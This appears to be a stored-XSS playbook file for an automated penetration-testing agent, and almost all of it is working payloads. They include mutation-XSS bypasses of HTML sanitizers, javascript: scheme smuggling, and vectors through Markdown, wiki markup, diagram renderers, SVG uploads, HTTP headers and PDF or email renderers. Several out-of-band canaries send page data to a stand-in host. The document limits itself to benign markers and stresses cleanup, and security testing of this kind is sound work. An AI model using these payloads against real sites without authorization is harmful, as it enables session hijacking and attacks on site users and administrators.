# Stored XSS payloads: output-context + sanitizer bypass (step 6)
# Stored XSS is usually filtered on OUTPUT (and the store may sanitize too). The payload that
# counts is the one that EXECUTES on the render surface after its encoder/sanitizer.
# Record every attempt in payloads_tried.jsonl: {candidate_id, render_surface, payload, stored, rendered, executed, viewer}.
# BENIGN confirmation only — stored payloads can hit real users (see SKILL §Safety).

## Confirmation payload — prefer OOB over alert (render surface may be an unseen admin view)
```
<img src=x onerror="new Image().src='https://OOB_HOST/s?'+encodeURIComponent(location.host+document.cookie.length)">
```
Fires on view, reports back which surface/viewer executed it — works even when you can't see
the admin render. `document.cookie.length` (not the cookie) keeps it benign.

## By render context (classify at the render surface, not the store)
- **HTML body:** `<svg onload=...>` · `<img src=x onerror=...>`
- **Attribute:** `"><svg onload=...>` · (unquoted) ` onmouseover=... `
- **JS string in an inline `<script>` that echoes stored data:** `'-...-'` · `';...//`
- **Markdown → HTML** (comments/wikis): `[x](javascript:...)` · raw HTML passthrough · `<img>` in MD
- **Attribute in a templated link:** `javascript:` in a stored URL field (avatar/website)

## Against HTML sanitizers (DOMPurify & friends) — mutation XSS
Sanitized-HTML surfaces (rich comments, wikis) strip obvious vectors; look for mXSS where the
browser re-parses sanitized output into something executable:
```
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=...>
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=... src>">
<noscript><p title="</noscript><img src=x onerror=...>">
```
Also test: sanitizer version (retire.js/libraries.jsonl), `svg`/`mathml` namespaces, nested
`style`/`template`, and known-CVE bypasses for the specific sanitizer + version in use.

## Store-side gotchas
- length caps / truncation may cut the payload — use short vectors.
- the store may HTML-encode but the render may decode (double-decoding) — test the round trip.
- different render surfaces of the SAME stored value may have different contexts — test each.

Pick the lowest-complexity payload that survives the specific output filter; don't escalate to
mXSS until a simple vector is proven filtered. Confirm EXECUTION cross-session (verify.md).

---

## Extended arsenal — HTML-sanitizer bypass taxonomy
Classify the defense, then pick the class. A stored payload can hit real/admin viewers (SKILL §Safety)
— prefer `alert(document.domain)` for an in-view PoC and the OOB canary for an unseen admin render.
### Namespace confusion (HTML ↔ SVG ↔ MathML foreign content)
```
<svg><style><img src=x onerror=alert(document.domain)></style></svg>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(document.domain)>
<svg><annotation-xml encoding="text/html"><img src=x onerror=alert(document.domain)></annotation-xml></svg>
<math><annotation-xml encoding="application/xhtml+xml"><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(document.domain)></body></annotation-xml></math>
```
### Allowed-tag abuse (sanitizer keeps the tag; you abuse its attributes)
```
<a href="javascript:alert(document.domain)">link</a>
<a href="data:text/html,<script>alert(document.domain)</script>">x</a>
<img src=x onerror=alert(document.domain)>                 # if on* survives
<form action="javascript:alert(document.domain)"><button>go</button></form>
<iframe srcdoc="&lt;svg onload=alert(document.domain)&gt;"></iframe>    # srcdoc double-decode
<details open ontoggle=alert(document.domain)>
<xss style="animation-name:x" onanimationstart=alert(document.domain)></xss><style>@keyframes x{}</style>
```
### Attribute-injection / quote-break (value lands in a templated attribute after sanitize)
```
"><img src=x onerror=alert(document.domain)>
" onmouseover=alert(document.domain) x="
```
### Scheme smuggling in URL-bearing fields (avatar / website / link)
```
javascript:alert(document.domain)
javascript:alert(document.domain)//
 javascript:alert(document.domain)         # leading whitespace/control chars
java&#09;script:alert(document.domain)
data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4=
```
### mXSS on re-serialization (sanitize → innerHTML round-trip)
```
<noscript><p title="</noscript><img src=x onerror=alert(document.domain)>">
<listing>&lt;img src=x onerror=alert(document.domain)&gt;</listing>
<svg></p><title><a id="</title><img src=x onerror=alert(document.domain)>">
```
### Config / version pivots
- Fingerprint the sanitizer + version (retire.js / libraries.jsonl / bundle strings). Bypass classes are
  tied to specific minor versions — a vector that fires on an old build is patched in a newer one; confirm
  against the live build.
- Test store-side and render-side filters independently (double-decoding: stored encoded, rendered decoded).

## Extended arsenal — stored vectors by store→render surface
### Rich-text / WYSIWYG (comments, wikis, tickets)
```
<a href="javascript:alert(document.domain)">styled</a>
<span style="background:url(javascript:alert(document.domain))">x</span>    # legacy
# paste-as-HTML path that bypasses the editor's own sanitizer
```
### Markdown → HTML
```
[x](javascript:alert(document.domain))
[x](java%0ascript:alert(document.domain))
![x](x"onerror="alert(document.domain))                 # image title-attr break
<img src=x onerror=alert(document.domain)>             # raw-HTML passthrough if allowed
[ref]: javascript:alert(document.domain)               # reference-style link
<https://HOST"><svg onload=alert(document.domain)>     # autolink attribute break
```
### Uploaded files served inline (high value)
```
# .svg served as image/svg+xml and rendered in-page (not via <img>):
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
# .html/.xhtml upload served same-origin → full XSS
# .xml with an xml-stylesheet → scripted transform (engine-dependent)
# EXIF/metadata (author/comment/XPKeywords) rendered in a gallery/admin → inject there
# filename rendered unescaped:  "><svg onload=alert(document.domain)>.jpg
```
### Header-sourced stored XSS (fires in admin log/analytics viewers)
```
User-Agent: <svg/onload=alert(document.domain)>
Referer: https://HOST/"><svg onload=alert(document.domain)>
X-Forwarded-For: <img src=x onerror=alert(document.domain)>
```
Viewer is usually staff → prefer the OOB canary (unseen surface); pair with header probing in the context feeder.
### Second-order into email / PDF
```
# benign when stored, later rendered into an invoice/report PDF or an HTML email whose engine runs JS:
<img src=x onerror="new Image().src='//TOKEN.oob.example/pdf?'+document.domain">
```
Some PDF/office and mail renderers execute JS during generation — the OOB token attributes the fire even
though you never see the render.

## Extended arsenal — stored confirmation & hygiene
- Prefer an OOB canary carrying a per-injection token + `document.domain` so an unseen admin/staff render
  is attributable (verify.md rejects ambiguous callbacks).
- `document.domain` / `document.cookie.length` (a number) only — never the cookie value or real user data.
- Keep a short greppable alnum marker alongside to locate WHERE it rendered without execution.
- Record every injected artifact in cleanup.md for removal (stored payloads persist for real users).

---

## Extended arsenal — diagram & documentation renderers (beyond Markdown)
Doc / wiki / ticket surfaces often run MORE than Markdown — each doc markup has its own link sink, and
diagram renderers parse a mini-language that can emit links / HTML / inline SVG. Fingerprint the
renderer (+ version), then pick the sink. Benign marker only.
### Documentation-markup link sinks (`javascript:` / `data:` in a URL position)
```
RDoc:               {text}[javascript:alert(document.domain)]
Textile:            "text":javascript:alert(document.domain)
BBCode:             [url=javascript:alert(document.domain)]text[/url]
reStructuredText:   `text <javascript:alert(document.domain)>`_
AsciiDoc:           link:javascript:alert(document.domain)[text]
MediaWiki/wikitext: [javascript:alert(document.domain) text]        # external-link syntax
```
Many renderers allowlist schemes on OUTPUT — defeat a naive check with `data:text/html`, an
entity/space-smuggled scheme (`java&#09;script:`), or `javascript://%0aalert(document.domain)`
(see scheme-smuggling above).
### Diagram renderers (server- or client-side; render user text into SVG/HTML)
```
# Mermaid (needs securityLevel != 'strict'; label-HTML + click/link are version-dependent):
click NodeId "javascript:alert(document.domain)"
A["<img src=x onerror=alert(document.domain)>"]
# PlantUML / Kroki — link on a node:
@startuml
url of A is [[javascript:alert(document.domain)]]
@enduml
# Graphviz/DOT (e.g. via Kroki) — node URL attribute:
digraph{ a[URL="javascript:alert(document.domain)"] }
```
A diagram endpoint that returns **SVG served same-origin inline** is an SVG-upload XSS surface — treat
it as such (cookie-scope impact). Pin the renderer version (bundle string / `libraries.jsonl`):
label/HTML support and the default `securityLevel` differ across versions.
